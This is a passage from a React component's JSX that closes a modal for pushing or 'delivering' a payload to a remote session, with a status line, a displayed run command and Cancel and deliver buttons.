              {push.run && <div className="mdl-note mono">{payloadRunCmd(push)}</div>}
              {push.note && <div className={push.note.startsWith('⚠') ? 'mdl-err' : 'mdl-ok'}>{push.note}</div>}
            </div>
            <div className="mdl-ft">
              <button className="g" disabled={push.stage !== 'idle'} onClick={() => setPush(null)}>{t('cancelWord')}</button>
              <button className="p" disabled={!push.session || !push.remote || push.stage !== 'idle'} onClick={() => void doPush()}>{t('plDeliverGo')}</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

